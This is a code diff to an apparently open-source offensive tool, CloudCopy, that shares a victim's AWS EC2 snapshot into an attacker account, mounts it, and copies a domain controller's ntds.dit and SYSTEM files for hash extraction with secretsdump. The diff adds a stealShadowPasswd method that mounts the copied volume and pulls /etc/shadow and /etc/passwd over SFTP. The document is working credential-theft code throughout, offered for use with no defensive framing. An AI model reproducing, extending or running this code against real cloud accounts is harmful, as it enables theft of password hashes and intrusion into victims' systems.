@@ -11,6 +11,7 @@ from botocore.exceptions import ClientError
 Util methods for actually CloudCopying
 '''
 class CloudCopyUtils:
+
     def __init__(self, loginContext):
         self.keyName = str(uuid.uuid4())
         self.loginContext = loginContext  # contains context for the CloudCopy attack
@@ -59,7 +60,7 @@ class CloudCopyUtils:
         if self.victimSnapshot:
             self.attackMode = 'victim'
             try:
-                self.createEc2Resource()
+                self.createBotoClient()
                 snapshot = self.botoClient.Snapshot(self.victimSnapshot.snapshot_id)
                 snapshot.delete()
                 print("Deleted snapshot " + self.victimSnapshot.snapshot_id)
@@ -72,7 +73,7 @@ class CloudCopyUtils:
         self.attackMode = attackContext
 
     # creates the boto3.Resource for accessing AWS
-    def createEc2Resource(self):
+    def createBotoClient(self):
         try:
             if self.loginContext['type'] == 'profile':
                 self.botoClient = boto3.Session(profile_name=self.loginContext['options'][self.attackMode + 'Profile'],
@@ -134,7 +135,7 @@ class CloudCopyUtils:
             print("Snapshot should have been shared. Switching to attacker account.")
             self.setAttackContext('attacker')
             try:
-                self.createEc2Resource()
+                self.createBotoClient()
             except ClientError:
                 return False
             self.victimSnapshot = self.botoClient.Snapshot(self.victimSnapshot.snapshot_id)
@@ -261,11 +262,10 @@ class CloudCopyUtils:
         sftp = connection.open_sftp()
         return connection, sftp
 
-
     # SSH's into the instance mounts the DC snapshot copies the ntds.dit and SYSTEM file gives ownership to ec2-user
     # SFTP's into the instance and downloads the ntds.dit and SYSTEM file locally
     # runs impacket's secretsdump tool to recreate the hashes. Expects secretsdump to be on your path.
-    def grabDCHashFiles(self):
+    def stealDCHashFiles(self):
         outfileUid = str(uuid.uuid4())
         connection, sftp = self.connectToInstance()
         self.printGap()
@@ -292,9 +292,42 @@ class CloudCopyUtils:
             connection.close()
             self.printGap()
             print("finally gonna run secretsdump!")
+        except Exception as e:
+            print("hmm copying files didn't seem to work. Maybe just sftp in yourself and run this part.")
+        try:
             import subprocess
             subprocess.run(
                 ["secretsdump.py", "-system", "./SYSTEM-" + outfileUid, "-ntds", "./ntds.dit-" + outfileUid, "local",
                  "-outputfile", "secrets-" + outfileUid])
+        except FileNotFoundError:
+            print("hmm can't seem to find secretsdump on your path. Run this manually against the files.")
+
+    # Same as above we are just stealing /etc/shadow and /etc/passwd now
+    def stealShadowPasswd(self):
+        outfileUid = str(uuid.uuid4())
+        connection, sftp = self.connectToInstance()
+        self.printGap()
+        #   have to block on these calls to ensure they happen in order
+        _, stdout, _ = connection.exec_command("sudo mkdir /linux")
+        stdout.channel.recv_exit_status()
+        _, stdout, _ = connection.exec_command("sudo mount /dev/xvdf1 /linux/")
+        stdout.channel.recv_exit_status()
+        _, stdout, _ = connection.exec_command("sudo cp /linux/etc/shadow /home/ec2-user/shadow")
+        stdout.channel.recv_exit_status()
+        _, stdout, _ = connection.exec_command("sudo cp /linux/etc/passwd /home/ec2-user/passwd")
+        stdout.channel.recv_exit_status()
+        _, stdout, _ = connection.exec_command("sudo chown ec2-user:ec2-user /home/ec2-user/*")
+        stdout.channel.recv_exit_status()
+        print("finished configuring instance to grab Shadow and Passwd files")
+        self.printGap()
+        print("Pulling the files...")
+        try:
+            sftp.get("/home/ec2-user/shadow", "./shadow-" + outfileUid)
+            print("/etc/shadow file retrieval complete")
+            sftp.get("/home/ec2-user/passwd", "./passwd-" + outfileUid)
+            print("/etc/passwd file retrieval complete")
+            sftp.close()
+            connection.close()
+            self.printGap()
         except Exception as e:
             print("hmm copying files didn't seem to work. Maybe just sftp in yourself and run this part.")
